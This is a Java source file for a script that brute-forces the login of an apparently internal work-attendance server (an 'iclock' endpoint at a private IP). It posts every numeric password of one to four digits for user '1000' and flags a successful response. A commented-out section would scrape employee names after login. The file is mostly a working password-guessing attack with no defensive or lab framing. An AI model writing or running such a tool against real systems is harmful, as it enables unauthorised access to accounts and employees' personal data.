package me.kelei.wa.oldversion;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class WorkAttendanceUserData {
	
	public void httpClientLogin(String userName, String userPwd) throws Exception{
		String url = "http://192.168.120.220:8000/iclock/accounts/login/";
		HttpClient client = new DefaultHttpClient();
		
		HttpPost login = new HttpPost(url);
		
		login.addHeader("X-Requested-With", "XMLHttpRequest");
		
		List<NameValuePair> nvps = new ArrayList<NameValuePair>();
		nvps.add(new BasicNameValuePair("username", userName));
		nvps.add(new BasicNameValuePair("password", userPwd));
		login.setEntity(new UrlEncodedFormEntity(nvps));
		
		HttpResponse response = client.execute(login);
		if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
			HttpEntity entity = response.getEntity();
			if (entity != null) {
				BufferedReader br = new BufferedReader(new InputStreamReader(
						entity.getContent(), "utf-8"));
				String line = null;
				while ((line = br.readLine()) != null) {
					if(line.contains("\"ret\": 1")){
						System.out.println(userPwd + "      密码已改");
					}else{
						System.out.println("=================================" + userPwd + "=================================");
					}
				}
			}
		}
		
		//获取用户ID
//		HttpGet get = new HttpGet("http://192.168.120.220:8000/iclock/staff/");
//		response = client.execute(get);
//		String name = "";
//		if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
//			HttpEntity entity = response.getEntity();
//			if (entity != null) {
//				BufferedReader br = new BufferedReader(new InputStreamReader(
//						entity.getContent(), "utf-8"));
//				String line = null;
//				while ((line = br.readLine()) != null) {
//					if(line.contains("员工")){
//						int sindex = line.indexOf("员工");
//						line = line.substring(sindex);
//						name = line.substring(0, line.indexOf("<")).replace("员工 ", "");
//						System.out.println(userName + "      " + name);
//					}
//				}
//			}
//		}
	}

	
	public String getRandomPassword2() {
		 char[] chars = { '0', '1', '2', '3', '4', '5', '6', '7',
		 '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
		 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
		 'y', 'z', 'A', 'B','C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
		 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
		 'Z'}; //62个字符集

		// ,'!','@','#','$','%','^','&','*','~','|'
		 
		Random random1 = new Random();
		int count = random1.nextInt(6) + 4;

		String rpasswords = "";
		Random random = new Random();
		for (int i = 0; i < count; i++) {
			StringBuilder password = new StringBuilder("");

			for (int m = 1; m <= count; m++) {

				password.append(chars[random.nextInt(26)]);
			}
			rpasswords = password.toString();
		}
		return rpasswords;
	}
     
     
	
	
	private boolean createPassWord(char[] str, int n, int len) throws Exception {
		if (n == len) {
			String ps = new String(str);
			httpClientLogin("1000", ps);
			return false;
		}
		for (int i = 0; i <= 9; i++) {
			str[n] = (char) (i + '0');
			if (createPassWord(str, n + 1, len))
				return true;
		}
		return false;
	}
	
	public static void main(String[] args) throws Exception {
		WorkAttendanceUserData userData = new WorkAttendanceUserData();
		for (int i = 0; i < 4; i++) {  
            if (userData.createPassWord(new char[i + 1], 0, i + 1))  
                break;  
        }  
	}
}
